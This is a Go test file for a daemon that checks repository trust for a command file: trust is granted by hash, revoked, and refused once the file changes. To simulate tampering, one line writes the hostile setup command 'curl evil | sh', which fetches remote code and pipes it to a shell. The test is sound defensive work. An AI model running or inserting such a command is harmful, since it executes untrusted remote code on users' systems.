package daemon

import (
	"context"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/ironpark/mako/internal/client"
	"github.com/ironpark/mako/internal/config"
	"github.com/ironpark/mako/internal/protocol"
	"github.com/ironpark/mako/internal/repotrust"
)

// A front-end shows a repository's command file and trusts it as shown,
// through the daemon, which keeps the trust in the configuration directory
// it runs with, though New was given none.
func TestRepoTrustThroughTheDaemon(t *testing.T) {
	home := t.TempDir()
	t.Setenv("MAKO_HOME", home)
	cfg := config.Default()
	cfg.P2P.Disabled = true
	d := New(cfg, slog.New(slog.NewTextHandler(io.Discard, nil)))
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan error, 1)
	go func() { done <- d.Run(ctx) }()
	t.Cleanup(func() { cancel(); <-done })
	select {
	case <-d.Ready():
	case <-time.After(5 * time.Second):
		t.Fatal("daemon did not become ready")
	}
	c, err := client.Dial(t.Context(), d.Socket())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = c.Close() })

	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(repo, ".mako", "worktree.toml")
	if err := os.MkdirAll(filepath.Dir(file), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(file, []byte("setup_cmd = \"make\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	show := func() *protocol.TrustedFile {
		t.Helper()
		info, err := c.RepoTrust(ctx, &protocol.RepoTrust{Path: file})
		if err != nil || len(info.GetFiles()) != 1 {
			t.Fatalf("show = %v, %v", info, err)
		}
		return info.GetFiles()[0]
	}
	f := show()
	if f.GetTrusted() || f.GetPath() != ".mako/worktree.toml" || string(f.GetContent()) != "setup_cmd = \"make\"\n" {
		t.Fatalf("shown = %+v", f)
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustAllow, Path: file}); err == nil {
		t.Fatal("trusted without the hash shown")
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustAllow, Path: file, Sha256: f.GetSha256()}); err != nil {
		t.Fatal(err)
	}
	if !show().GetTrusted() {
		t.Fatal("not trusted once trusted")
	}
	if !repotrust.Open(home).Trusted(repo, ".mako/worktree.toml", []byte("setup_cmd = \"make\"\n")) {
		t.Fatal("the trust is not kept in the configuration directory")
	}

	// A file that changed after it was shown is not trusted as shown.
	if err := os.WriteFile(file, []byte("setup_cmd = \"curl evil | sh\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if show().GetTrusted() {
		t.Fatal("a changed file is still trusted")
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustAllow, Path: file, Sha256: f.GetSha256()}); err == nil {
		t.Fatal("a file that changed since it was shown was trusted")
	}

	list, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustList})
	if err != nil || len(list.GetFiles()) != 1 || list.GetFiles()[0].GetSha256() != f.GetSha256() {
		t.Fatalf("list = %v, %v", list, err)
	}
	gone, err := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustRevoke, Path: repo})
	if err != nil || len(gone.GetFiles()) != 1 {
		t.Fatalf("revoke = %v, %v", gone, err)
	}
	if list, _ := c.RepoTrust(ctx, &protocol.RepoTrust{Op: protocol.RepoTrustList}); len(list.GetFiles()) != 0 {
		t.Fatalf("left after revoke = %v", list)
	}

	outside := filepath.Join(t.TempDir(), "x.toml")
	if err := os.WriteFile(outside, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Path: outside}); err == nil {
		t.Fatal("showed a file of no repository")
	}
	if _, err := c.RepoTrust(ctx, &protocol.RepoTrust{Path: "relative/x"}); err == nil {
		t.Fatal("took a relative path")
	}
}
